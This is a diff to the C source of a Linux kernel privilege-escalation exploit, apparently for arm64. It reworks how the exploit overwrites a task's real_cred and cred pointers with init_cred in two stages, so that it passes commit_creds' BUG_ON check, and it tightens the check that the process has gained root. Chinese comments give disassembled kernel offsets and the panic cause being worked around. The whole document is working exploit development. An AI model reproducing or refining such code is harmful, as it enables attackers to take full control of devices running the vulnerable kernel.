@@ -603,12 +603,30 @@ int run_exploit(int argc, char **argv) {
               fclose(st);
             }
           }
-          if ((ruid == 0 || euid == 0 || suid == 0 ||
-               rgid == 0 || egid == 0 || sgid == 0 || capeff != 0) && !root_seen) {
+          int gate_hit;
+          if (getenv("PSELECT_PTR_STRICT")) {
+            /* mt48 满帽 AND-gate: CapEff==0x1ffffffffff(init_cred 满帽, 只可能来自
+             * real_cred 已换 — status 读的是 __task_cred=real_cred) && euid==0
+             * (只可能来自 cred 已换 — getresuid 读 current_cred)。
+             * 半程态结构性不触发 → commit_creds 入口
+             *   cmp x8([x20+0x780]cred), x19([x20+0x778]real_cred); b.ne→brk#0x800
+             * (BUG_ON(task->cred != task->real_cred) @0xffffffc008185530)
+             * 永不引爆 — 这就是 mt32-36 + mt47PTR 7/7 全灭的机制。
+             * 旧 OR-gate 的 euid==0 在"只换 cred"半程即真(euid 是 init_cred 完好字段)
+             * → setresgid → commit_creds → 指针不等 → BUG → panic 重启。 */
+            gate_hit = (capeff >= 0x000001ffffffffffULL) && (euid == 0);
+          } else {
+            gate_hit = (ruid == 0 || euid == 0 || suid == 0 ||
+                        rgid == 0 || egid == 0 || sgid == 0 || capeff != 0);
+          }
+          if (gate_hit && !root_seen) {
             root_seen = 1;
             pr_success("mt47: ROOT-SEEN ids uid=%d euid=%d suid=%d gid=%d egid=%d sgid=%d CapEff=%016llx poll=%d\n",
                        ruid, euid, suid, rgid, egid, sgid, capeff, poll_i);
             fflush(stdout);
+            /* mt48: fflush 只到页缓存, panic 重启即丢 — 今天日志缺 ROOT-SEEN 的
+             * 合理解释。fsync 落盘, 崩了也留证。 */
+            fsync(fileno(stdout));
             setresgid(0, 0, 0);
             setresuid(0, 0, 0);
             getresuid(&ruid, &euid, &suid);
@@ -729,13 +747,32 @@ int run_exploit(int argc, char **argv) {
          * FIX_MODE(可选卫生轮): 零写 [init_cred+4] → uid+gid 归零。
          * 窗口模式: mt46 的 uid 零写轮扫(保留, 作对照/备份路线)。 */
         if (getenv("PSELECT_PTR_MODE")) {
-          snprintf(pc_env, sizeof(pc_env), "%zx",
-                   (size_t)(task + TASK_REAL_CRED_OFF));
+          /* mt48 两轮换指针: BUG_ON(task->cred != task->real_cred) 已铁证
+           * (commit_creds@0xffffffc008185174: ldr x19,[x20,#0x778]; ldr x8,[x20,#0x780];
+           *  cmp x8,x19; b.ne→brk#0x800) — 单发只换 cred + 子进程 setresgid =
+           * 确定性 panic (mt32-36 + mt47PTR 7/7)。修法: 两个指针都换成 init_cred。
+           *   STAGE=R: pc=task+0x770 → STORE(a) [task+0x778](real_cred)=init_cred
+           *   STAGE=C: pc=task+0x778 → STORE(a) [task+0x780](cred)=init_cred
+           * 两轮都落地 → real==cred==init_cred → commit_creds cmp 相等 → BUG_ON 通过。
+           * 半程态安全性(配合子进程满帽 AND-gate): 无论如何先后, gate 都不触发。
+           * STORE(b) 副作用两轮相同: [init_cred]=pc → usage=低32位(task dmap ≈3亿,
+           * 护身符), uid=高32位(0xffffff82) — setresuid 后子进程用私有 cred, 不再共享。 */
+          static int mt48_alt_stage = 0;
+          char mt48_stage = 'C';
+          char *st_env = getenv("PSELECT_PTR_STAGE");
+          if (st_env && (*st_env == 'R' || *st_env == 'r')) mt48_stage = 'R';
+          if (getenv("PSELECT_PTR_ALT"))
+            mt48_stage = (mt48_alt_stage++ % 2) ? 'C' : 'R';
+          size_t mt48_pc_off = (mt48_stage == 'R') ? (TASK_REAL_CRED_OFF - 8)
+                                                   : TASK_REAL_CRED_OFF;
+          snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(task + mt48_pc_off));
           snprintf(right_env, sizeof(right_env), "%zx",
                    (size_t)P0_DATA_ALIAS_CONST(INIT_CRED));
           snprintf(left_env, sizeof(left_env), "0");
-          pr_info("mt47: PTR_MODE task=%016zx pc=%s right=%s (STORE(a)→[task+0x780])\n",
-                  (size_t)task, pc_env, right_env);
+          pr_info("mt48: PTR stage=%c task=%016zx pc=%s right=%s (STORE(a)→[%s])\n",
+                  mt48_stage, (size_t)task, pc_env, right_env,
+                  mt48_stage == 'R' ? "task+0x778 real_cred" : "task+0x780 cred");
+          fflush(stdout);
         } else if (getenv("PSELECT_FIX_MODE")) {
           uintptr_t ic_alias = P0_DATA_ALIAS_CONST(INIT_CRED);
           snprintf(pc_env, sizeof(pc_env), "%zx", (size_t)(ic_alias - 4));
